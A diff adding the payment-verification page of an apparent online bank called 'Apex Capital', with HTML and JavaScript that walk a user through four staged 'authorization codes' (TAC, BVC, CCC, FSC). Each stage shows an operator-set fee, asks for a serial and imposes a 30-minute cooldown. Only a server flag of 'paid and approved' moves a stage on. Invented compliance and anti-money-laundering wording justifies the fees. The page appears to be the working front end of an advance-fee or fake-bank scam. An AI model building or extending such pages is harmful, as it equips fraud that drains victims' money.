+          Settings
+        </a>
+        <!-- <a href="user-profile.html" class="nav-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+          User Account
+        </a> -->
+      </div>
+
+      <div class="sidebar-footer">
+        <div class="user-pill">
+          <div class="user-avatar" id="userAvatar">JD</div>
+          <div class="user-info">
+            <div class="user-name" id="userName">Loading...</div>
+            <div class="user-role">Premium Member</div>
+          </div>
+        </div>
+      </div>
+    </aside>
+
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+
+    <!-- Main -->
+    <main class="main">
+      <!-- Topbar -->
+      <header class="topbar">
+        <div class="topbar-left">
+          <button class="mobile-toggle" onclick="toggleSidebar()">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+          </button>
+          <a href="dashboard.html" class="topbar-brand">
+            <div class="logo-orbital">
+              <div class="logo-ring logo-ring-outer"></div>
+              <div class="logo-ring logo-ring-mid"></div>
+              <div class="logo-ring logo-ring-inner"></div>
+              <div class="logo-core"></div>
+            </div>
+            <div class="topbar-brand-text">Apex <span><b>Capital</b></span></div>
+          </a>
+          <div class="search-box">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+            <input type="text" placeholder="Search transactions, contacts...">
+          </div>
+        </div>
+
+        <!-- Navbar Loader -->
+        <div class="nav-loader" id="navLoader">
+          <div class="logo-orbital">
+            <div class="logo-ring logo-ring-outer"></div>
+            <div class="logo-ring logo-ring-mid"></div>
+            <div class="logo-ring logo-ring-inner"></div>
+            <div class="logo-core"></div>
+          </div>
+          <span>Loading...</span>
+        </div>
+
+        <div class="topbar-actions">
+          <button class="icon-btn" id="notifBtn" onclick="toggleNotif()">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+            <span class="badge" id="notifBadge" style="display:none">0</span>
+            <div class="notif-dropdown" id="notifDropdown">
+              <div class="notif-header">
+                <h4>Notifications</h4>
+                <span onclick="event.stopPropagation(); markAllRead()">Mark all read</span>
+              </div>
+              <div class="notif-list" id="notifList">
+                <div class="notif-empty">Loading notifications...</div>
+              </div>
+            </div>
+          </button>
+          <button class="icon-btn" onclick="logout()">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+          </button>
+        </div>
+      </header>
+
+      <!-- Payment Verify Page -->
+      <div class="pay-page">
+        <div class="pay-header">
+          <h1>Payment Verification</h1>
+          <p>Complete your transaction securely.</p>
+        </div>
+
+        <!-- Billing Amount -->
+        <div class="billing-card" id="billingCard">
+          <div class="billing-loader" id="billingLoader">
+            <div class="billing-loader-spinner"></div>
+            <div class="billing-loader-text">Fetching code amount...</div>
+          </div>
+          <div class="billing-content" id="billingContent" style="display:none;">
+            <div class="billing-label" id="stageLabel">Stage 1</div>
+            <div class="billing-amount" id="billingAmount">$0.00</div>
+            <div class="billing-desc" id="amountDesc">Amount required for Stage 1 verification</div>
+          </div>
+          <div class="billing-error" id="billingError" style="display:none;">
+            <div class="billing-error-icon">!</div>
+            <div class="billing-error-text" id="billingErrorText">Failed to load amount</div>
+            <button class="billing-retry-btn" onclick="loadBillingAmounts()">Retry</button>
+          </div>
+        </div>
+
+        <!-- Stage Explanation -->
+        <div class="stage-explain" id="stageExplain">
+          <h4 id="explainTitle">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+            <span id="explainTitleText">Transfer Authorization Code (TAC)</span>
+          </h4>
+          <p id="explainBody">This code confirms that you are the authorized account holder initiating this transfer. It verifies your identity and intent to move the specified funds from your account.</p>
+        </div>
+
+        <!-- Timer Display -->
+        <div class="timer-display" id="timerDisplay">
+          <div class="timer-animation">
+            <div class="timer-spinner"></div>
+          </div>
+          <div class="timer-label">Next Stage Available In</div>
+          <div class="timer-value" id="timerValue">30:00</div>
+          <div class="timer-desc">Please wait for the cooldown period to complete before proceeding.</div>
+        </div>
+
+        <!-- Single Serial Input -->
+        <div class="code-panel" id="serialPanel" style="margin-bottom: 24px;">
+          <div class="code-info">
+            <h3>
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              <span id="serialTitle">Stage 1 Verification Serial</span>
+            </h3>
+            <p id="serialDesc">Enter your unique serial number to authorize Stage 1.</p>
+          </div>
+          <div class="code-input-wrap">
+            <label id="serialLabel">Serial Number 1</label>
+            <input type="text" class="code-input" id="serialNumber" placeholder="submit serial code" maxlength="13" style="letter-spacing: 2px;">
+          </div>
+          <button class="verify-btn" onclick="submitSerial()" id="serialSubmitBtn">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            <span id="serialBtnText">Submit Serial Number</span>
+          </button>
+          <div class="pay-status" id="serialStatus"></div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <!-- Notification Detail Modal -->
+  <div class="notif-modal" id="notifModal" onclick="if(event.target===this)closeNotifModal()">
+    <div class="notif-modal-card">
+      <div class="notif-modal-header">
+        <h3 id="modalNotifTitle">Notification</h3>
+        <button class="notif-modal-close" onclick="closeNotifModal()">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+        </button>
+      </div>
+      <div class="notif-modal-body" id="modalNotifBody">...</div>
+      <div class="notif-modal-meta" id="modalNotifMeta">...</div>
+      <button class="notif-modal-btn" onclick="closeNotifModal()">Close</button>
+    </div>
+  </div>
+
+  <!-- Process Overlay -->
+  <div class="process-overlay" id="processOverlay">
+    <div class="process-scene">
+      <div class="process-orbital">
+        <div class="process-ring process-ring-outer"></div>
+        <div class="process-ring process-ring-mid"></div>
+        <div class="process-ring process-ring-inner"></div>
+        <div class="process-core"></div>
+      </div>
+    </div>
+    <div class="process-label" id="processLabel">Processing...</div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+<script>
+    const API_BASE = 'https://nexusbank-jjy2.onrender.com/api/V1';
+    const token = localStorage.getItem('apex_token');
+    let notifications = [];
+    let currentUser = null;
+    let currentUserId = null;
+    let billingAmounts = [];
+    let currentStage = 1;
+    let timerInterval = null;
+
+    const STAGES = [
+      {
+        name: "Transfer Authorization Code",
+        short: "TAC",
+        explainTitle: "Transfer Authorization Code (TAC)",
+        explainBody: "This code confirms that you are the authorized account holder initiating this transfer. It verifies your identity and intent to move the specified funds from your account. Without this code, the transaction cannot be authorized by our security systems.",
+        codeLabel: "Enter Transfer Authorization Code",
+        codeTitle: "Transfer Authorization Code Required"
+      },
+      {
+        name: "Beneficiary Verification Code",
+        short: "BVC",
+        explainTitle: "Beneficiary Verification Code (BVC)",
+        explainBody: "This code validates the recipient account details and ensures the funds will reach the correct destination. It cross-checks the beneficiary name, account number, and bank routing information to prevent misdirected transfers.",
+        codeLabel: "Enter Beneficiary Verification Code",
+        codeTitle: "Beneficiary Verification Code Required"
+      },
+      {
+        name: "Compliance Clearance Code",
+        short: "CCC",
+        explainTitle: "Compliance Clearance Code (CCC)",
+        explainBody: "This code completes our anti-money laundering (AML) and regulatory compliance checks. It confirms that the transaction meets all legal requirements and has passed automated risk assessment protocols before final processing.",
+        codeLabel: "Enter Compliance Clearance Code",
+        codeTitle: "Compliance Clearance Code Required"
+      },
+      {
+        name: "Final Settlement Code",
+        short: "FSC",
+        explainTitle: "Final Settlement Code (FSC)",
+        explainBody: "This is the final authorization code that releases the funds for settlement. It confirms all prior validations are complete and authorizes the irrevocable transfer of funds to the beneficiary account.",
+        codeLabel: "Enter Final Settlement Code",
+        codeTitle: "Final Settlement Code Required"
+      }
+    ];
+
+    const TIMER_MINUTES = 30;
+    const REDIRECT_URL = 'transfer-successful.html';
+
+    // Auth gate
+    if (!token) {
+      window.location.href = 'auth.html#login';
+    } else {
+      setTimeout(() => document.getElementById('authGate').classList.add('done'), 1200);
+    }
+
+    // Persist read states
+    function getReadNotifs() {
+      try { return new Set(JSON.parse(localStorage.getItem('apex_read_notifs') || '[]')); }
+      catch { return new Set(); }
+    }
+    function saveReadNotifs(set) {
+      localStorage.setItem('apex_read_notifs', JSON.stringify([...set]));
+    }
+    let readNotifs = getReadNotifs();
+
+    // ===== USER-SPECIFIC LOCAL STORAGE HELPERS =====
+    function getStageKey() {
+      return currentUserId ? `apex_verify_stage_${currentUserId}` : 'apex_verify_stage';
+    }
+    function getStageData() {
+      try {
+        const raw = localStorage.getItem(getStageKey());
+        return raw ? JSON.parse(raw) : { stage: 1, timerStart: null, timerStage: null, amounts: [], serials: [] };
+      } catch { return { stage: 1, timerStart: null, timerStage: null, amounts: [], serials: [] }; }
+    }
+    function saveStageData(data) {
+      localStorage.setItem(getStageKey(), JSON.stringify(data));
+    }
+    function clearStageData() {
+      localStorage.removeItem(getStageKey());
+      localStorage.removeItem('apex_verify_stage');
+    }
+
+    // API helper with navbar loader
+    async function apiGet(endpoint) {
+      const navLoader = document.getElementById('navLoader');
+      navLoader.classList.add('show');
+      try {
+        const res = await fetch(API_BASE + endpoint, {
+          headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' }
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.message || 'Request failed');
+        return data;
+      } catch (err) {
+        console.error('API Error:', err);
+        showToast(err.message, 'error');
+        return null;
+      } finally {
+        navLoader.classList.remove('show');
+      }
+    }
+
+    async function apiPost(endpoint, body) {
+      try {
+        const res = await fetch(API_BASE + endpoint, {
+          method: 'POST',
+          headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
+          body: JSON.stringify(body)
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.message || 'Request failed');
+        return data;
+      } catch (err) {
+        console.error('API Error:', err);
+        showToast(err.message, 'error');
+        return null;
+      }
+    }
+
+    // ===== LOAD BILLING AMOUNTS =====
+    async function loadBillingAmounts() {
+      document.getElementById('billingLoader').style.display = 'flex';
+      document.getElementById('billingContent').style.display = 'none';
+      document.getElementById('billingError').style.display = 'none';
+
+      try {
+        const res = await fetch(API_BASE + '/user/viewProfile', {
+          headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' }
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.message || 'HTTP ' + res.status);
+        console.log(data)
+        const userArr = data.data || data.user || data;
+        const user = Array.isArray(userArr) ? userArr[0] : userArr;
+        if (!user) throw new Error('User data not found in profile response');
+
+        currentUserId = user.userId || user._id || user.id;
+        if (!currentUserId) throw new Error('User ID not found in profile');
+
+        currentUser = user;
+        const fullName = user.fullname || user.name || 'User';
+        document.getElementById('userName').textContent = fullName;
+        document.getElementById('userAvatar').textContent = fullName.split(' ').map(n => n[0]).join('').slice(0,2).toUpperCase();
+
+        // Determine current stage based on approval status from API
+        if (user.fourthApprovals === "paid and approved") {
+          window.location.href = REDIRECT_URL;
+          return;
+        } else if (user.thirdApprovals === "paid and approved") {
+          currentStage = 4;
+        } else if (user.secondApprovals === "paid and approved") {
+          currentStage = 3;
+        } else if (user.firstApprovals === "paid and approved") {
+          currentStage = 2;
+        } else {
+          currentStage = 1;
+        }
+
+        const stageData = getStageData();
+
+        if (stageData.amounts && stageData.amounts.length === 4) {
+          billingAmounts = stageData.amounts;
+        } else {
+          billingAmounts = [
+            parseFloat(user.billing1amount) || 0,
+            parseFloat(user.billing2amount) || 0,
+            parseFloat(user.billing3amount) || 0,
+            parseFloat(user.billing4amount) || 0
+          ];
+          stageData.amounts = billingAmounts;
+        }
+
+        stageData.stage = currentStage;
+        saveStageData(stageData);
+
+        showBillingContent();
+
+        // Resume timer if one exists for the PREVIOUS stage (cooldown before current stage)
+        if (stageData.timerStart && stageData.timerStage === currentStage - 1) {
+          const now = Date.now();
+          const elapsed = now - stageData.timerStart;
+          const totalMs = TIMER_MINUTES * 60 * 1000;
+
+          if (elapsed < totalMs) {
+            // Still running — hide inputs, show timer
+            document.getElementById('serialPanel').style.display = 'none';
+            document.getElementById('stageExplain').style.display = 'none';
+            document.getElementById('billingCard').style.display = 'none';
+            document.getElementById('timerDisplay').classList.add('show');
+          }
+          // startTimerDisplay handles both running and expired internally
+          startTimerDisplay();
+        } else {
+          // Clear stale timer data from previous stages
+          if (stageData.timerStart || stageData.timerStage) {
+            const fresh = getStageData();
+            fresh.timerStart = null;
+            fresh.timerStage = null;
+            saveStageData(fresh);
+          }
+          renderStage();
+        }
+
+      } catch (err) {
+        console.error('[Billing] Failed:', err);
+        document.getElementById('billingLoader').style.display = 'none';
+        document.getElementById('billingContent').style.display = 'none';
+        document.getElementById('billingError').style.display = 'flex';
+        document.getElementById('billingErrorText').textContent = err.message || 'Failed to load code amount';
+        showToast('Failed to load code amount: ' + (err.message || 'Unknown error'), 'error');
+      }
+    }
+
+    function showBillingContent() {
+      document.getElementById('billingLoader').style.display = 'none';
+      document.getElementById('billingContent').style.display = 'block';
+      document.getElementById('billingError').style.display = 'none';
+    }
+
+    function formatAmount(amount) {
+      return '$' + parseFloat(amount || 0).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+    }
+
+    // ===== SUBMIT SINGLE SERIAL (per stage) =====
+    async function submitSerial() {
+      if (!currentUserId) {
+        showToast('User ID not available. Please wait for profile to load.', 'error');
+        return;
+      }
+
+      const value = document.getElementById('serialNumber').value.trim();
+      if (!value) {
+        showStatus('Please enter serial code for Stage ' + currentStage, 'error', 'serialStatus');
+        return;
+      }
+
+      if (value.length !== 13) {
+        showStatus('Serial code must be exactly 13 characters', 'error', 'serialStatus');
+        return;
+      }
+
+      const digitCount = (value.match(/\d/g) || []).length;
+      const letterCount = (value.match(/[a-zA-Z]/g) || []).length;
+
+      if (digitCount !== 10 || letterCount !== 3 || !/^[a-zA-Z0-9]+$/.test(value)) {
+        showStatus('Serial must contain exactly 10 numbers and 3 letters', 'error', 'serialStatus');
+        return;
+      }
+
+      const btn = document.getElementById('serialSubmitBtn');
+      btn.disabled = true;
+      showLoader('Submitting serial number ' + currentStage + '...');
+
+      // Accumulate serials into localStorage for reference
+      const stageData = getStageData();
+      if (!stageData.serials) stageData.serials = [];
+      stageData.serials[currentStage - 1] = value;
+
+      const body = { 
+        'serial' : value 
+      };
+
+      try {
+        const res = await fetch(API_BASE + '/user/inputSerials', {
+          method: 'PUT',
+          headers: {
+            'Authorization': 'Bearer ' + token,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(body)
+        });
+
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.message || 'HTTP ' + res.status);
+
+        showStatus('Serial ' + currentStage + ' submitted successfully! Starting cooldown...', 'success', 'serialStatus');
+        showToast('Serial ' + currentStage + ' submitted successfully', 'success');
+
+        // Save progress and start timer
+        stageData.stage = currentStage;
+        stageData.serials[currentStage - 1] = value;
+        stageData.timerStart = Date.now();
+        stageData.timerStage = currentStage;
+        saveStageData(stageData);
+
+        // Hide everything except timer + animation
+        document.getElementById('serialPanel').style.display = 'none';
+        document.getElementById('stageExplain').style.display = 'none';
+        document.getElementById('billingCard').style.display = 'none';
+        document.getElementById('timerDisplay').classList.add('show');
+        startTimerDisplay();
+
+      } catch (err) {
+        console.error('[Serial] Submit failed:', err);
+        showStatus('Failed to submit serial: ' + err.message, 'error', 'serialStatus');
+        showToast('Failed to submit serial: ' + err.message, 'error');
+      } finally {
+        hideLoader();
+        btn.disabled = false;
+      }
+    }
+
+    // ===== RENDER CURRENT STAGE =====
+    function renderStage() {
+      const stage = STAGES[currentStage - 1];
+      if (!stage) return;
+
+      const amount = billingAmounts[currentStage - 1] || 0;
+      const formatted = formatAmount(amount);
+
+      // Billing card
+      document.getElementById('stageLabel').textContent = 'Stage ' + currentStage;
+      document.getElementById('billingAmount').textContent = formatted;
+      document.getElementById('amountDesc').textContent = 'Amount required for Stage ' + currentStage + ' verification';
+
+      // Explanation
+      document.getElementById('explainTitleText').textContent = stage.explainTitle;
+      document.getElementById('explainBody').textContent = stage.explainBody;
+
+      // Serial panel text updates
+      document.getElementById('serialTitle').textContent = 'Stage ' + currentStage + ' Verification Serial';
+      document.getElementById('serialDesc').textContent = 'Enter your unique serial number to authorize Stage ' + currentStage + '.';
+      document.getElementById('serialLabel').textContent = 'Serial Number ' ;
+      document.getElementById('serialNumber').placeholder = 'submit serial code';
+      document.getElementById('serialBtnText').textContent = 'Submit Serial Number ';
+      document.getElementById('serialNumber').value = '';
+      document.getElementById('serialStatus').classList.remove('show');
+
+      // Always show stage content, hide timer
+      document.getElementById('timerDisplay').classList.remove('show');
+      document.getElementById('serialPanel').style.display = 'block';
+      document.getElementById('stageExplain').style.display = 'block';
+      document.getElementById('billingCard').style.display = 'block';
+    }
+
+    // ===== TIMER LOGIC =====
+    function startTimerDisplay() {
+      if (timerInterval) clearInterval(timerInterval);
+
+      const stageData = getStageData();
+      if (!stageData.timerStart) return;
+
+      // Check immediately if timer already expired
+      const now = Date.now();
+      const start = stageData.timerStart;
+      const elapsed = now - start;
+      const totalMs = TIMER_MINUTES * 60 * 1000;
+      let remaining = totalMs - elapsed;
+
+      if (remaining <= 0) {
+        // Timer expired while away
+        timerInterval = null;
+        const completedStage = stageData.timerStage || currentStage;
+        stageData.timerStart = null;
+        stageData.timerStage = null;
+        const nextStage = completedStage + 1;
+        stageData.stage = nextStage;
+        saveStageData(stageData);
+
+        currentStage = nextStage;
+
+        if (currentStage > 4) {
+          clearStageData();
+          window.location.href = REDIRECT_URL;
+          return;
+        }
+
+        document.getElementById('timerDisplay').classList.remove('show');
+        renderStage();
+        showToast('Stage ' + completedStage + ' complete. Proceed to Stage ' + nextStage, 'success');
+        return;
+      }
+
+      // Show remaining time immediately
+      const mins = Math.floor(remaining / 60000);
+      const secs = Math.floor((remaining % 60000) / 1000);
+      document.getElementById('timerValue').textContent = 
+        String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+
+      timerInterval = setInterval(() => {
+        const now = Date.now();
+        const start = stageData.timerStart;
+        const elapsed = now - start;
+        const totalMs = TIMER_MINUTES * 60 * 1000;
+        const remaining = totalMs - elapsed;
+
+        if (remaining <= 0) {
+          clearInterval(timerInterval);
+          timerInterval = null;
+
+          const completedStage = stageData.timerStage || currentStage;
+          stageData.timerStart = null;
+          stageData.timerStage = null;
+          const nextStage = completedStage + 1;
+          stageData.stage = nextStage;
+          saveStageData(stageData);
+
+          currentStage = nextStage;
+
+          if (currentStage > 4) {
+            clearStageData();
+            window.location.href = REDIRECT_URL;
+            return;
+          }
+
+          document.getElementById('timerDisplay').classList.remove('show');
+          renderStage();
+          showToast('Stage ' + completedStage + ' complete. Proceed to Stage ' + nextStage, 'success');
+          return;
+        }
+
+        const mins = Math.floor(remaining / 60000);
+        const secs = Math.floor((remaining % 60000) / 1000);
+        document.getElementById('timerValue').textContent = 
+          String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+      }, 1000);
+    }
+
+    function showStatus(msg, type, elementId) {
+      const el = document.getElementById(elementId || 'payStatus');
+      if (!el) return;
+      el.textContent = msg;
+      el.className = 'pay-status show ' + type;
+      setTimeout(() => el.classList.remove('show'), 5000);
+    }
+
+    // Notifications
+    async function loadNotifications() {
+      const data = await apiGet('/notification/viewAllNotification');
+      if (data) {
+        const arr = data.data || data.notifications || [];
+        notifications = Array.isArray(arr) ? arr : [];
+        renderNotifications();
+      }
+    }
+
+    function isRead(n) {
+      return n.isRead === true || readNotifs.has(n._id || n.id);
+    }
+
+    function renderNotifications() {
+      const list = document.getElementById('notifList');
+      const badge = document.getElementById('notifBadge');
+      if (!notifications.length) {
+        list.innerHTML = '<div class="notif-empty">No notifications yet</div>';
+        badge.style.display = 'none';
+        return;
+      }
+      const unreadCount = notifications.filter(n => !isRead(n)).length;
+      badge.textContent = unreadCount > 99 ? '99+' : unreadCount;
+      badge.style.display = unreadCount > 0 ? 'grid' : 'none';
+      const sorted = [...notifications].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0)).slice(0, 25);
+      list.innerHTML = sorted.map(n => {
+        const id = n._id || n.id;
+        const read = isRead(n);
+        const title = n.notificationTitle || 'Notification';
+        const msg = n.notificationMessage || '';
+        const time = n.createdAt ? new Date(n.createdAt).toLocaleString() : 'Just now';
+        return `<div class="notif-item ${read ? '' : 'unread'}" onclick="openNotif('${id}')"><div class="notif-dot"></div><div class="notif-body"><div class="notif-title">${escapeHtml(title)}</div><div class="notif-preview">${escapeHtml(msg)}</div><div class="notif-time">${time}</div></div></div>`;
+      }).join('');
+    }
+
+    function openNotif(id) {
+      const n = notifications.find(x => (x._id || x.id) === id);
+      if (!n) return;
+      if (!isRead(n)) { readNotifs.add(id); saveReadNotifs(readNotifs); renderNotifications(); }
+      document.getElementById('modalNotifTitle').textContent = n.notificationTitle || 'Notification';
+      document.getElementById('modalNotifBody').textContent = n.notificationMessage || '';
+      document.getElementById('modalNotifMeta').textContent = n.createdAt ? new Date(n.createdAt).toLocaleString(undefined, { weekday:'long', year:'numeric', month:'long', day:'numeric', hour:'2-digit', minute:'2-digit' }) : '';
+      document.getElementById('notifModal').classList.add('show');
+      document.getElementById('notifDropdown').classList.remove('show');
+    }
+    function closeNotifModal() { document.getElementById('notifModal').classList.remove('show'); }
+    function toggleNotif() { document.getElementById('notifDropdown').classList.toggle('show'); }
+    function markAllRead() { notifications.forEach(n => readNotifs.add(n._id || n.id)); saveReadNotifs(readNotifs); renderNotifications(); showToast('All notifications marked as read', 'success'); }
+    document.addEventListener('click', (e) => { if (!e.target.closest('#notifBtn')) document.getElementById('notifDropdown').classList.remove('show'); });
+
+    function escapeHtml(text) {
+      const div = document.createElement('div');
+      div.textContent = text;
+      return div.innerHTML;
+    }
+
+    // UI Helpers
+    function toggleSidebar() {
+      document.getElementById('sidebar').classList.toggle('open');
+      document.getElementById('sidebarOverlay').classList.toggle('show');
+    }
+    function logout() {
+      showLoader('Signing out...');
+      setTimeout(() => {
+        localStorage.removeItem('apex_token');
+        localStorage.removeItem('apex_token_time');
+        if (currentUserId) localStorage.removeItem(`apex_verify_stage_${currentUserId}`);
+        localStorage.removeItem('apex_verify_stage');
+        sessionStorage.removeItem('apex_welcome_pending');
+        window.location.href = 'auth.html#login';
+      }, 1000);
+    }
+    function showLoader(text) {
+      document.getElementById('processLabel').textContent = text || 'Processing...';
+      document.getElementById('processOverlay').classList.add('show');
+    }
+    function hideLoader() {
+      document.getElementById('processOverlay').classList.remove('show');
+    }
+    function showToast(message, type) {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.classList.add('show');
+      if (type === 'error') {
+        toast.style.background = 'linear-gradient(135deg, #c0392b, #e74c3c)';
+        toast.style.color = '#fff';
+      } else if (type === 'success') {
+        toast.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';
+        toast.style.color = '#fff';
+      } else {
+        toast.style.background = 'linear-gradient(135deg, var(--slate), var(--sky))';
+        toast.style.color = 'var(--deep)';
+      }
+      setTimeout(() => {
+        toast.classList.remove('show');
+        toast.style.background = '';
+        toast.style.color = '';
+      }, 6000);
+    }
+
+    // Floating Particles
+    function createParticles() {
+      const container = document.getElementById('particles');
+      for (let i = 0; i < 20; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.animationDuration = (8 + Math.random() * 12) + 's';
+        p.style.animationDelay = Math.random() * 10 + 's';
+        p.style.width = (2 + Math.random() * 3) + 'px';
+        p.style.height = p.style.width;
+        container.appendChild(p);
+      }
+    }
+    createParticles();
+
+    // Init
+    document.addEventListener('DOMContentLoaded', () => {
+      loadNotifications();
+      loadBillingAmounts();
+    });
+</script>
+
+</body>
+</html>
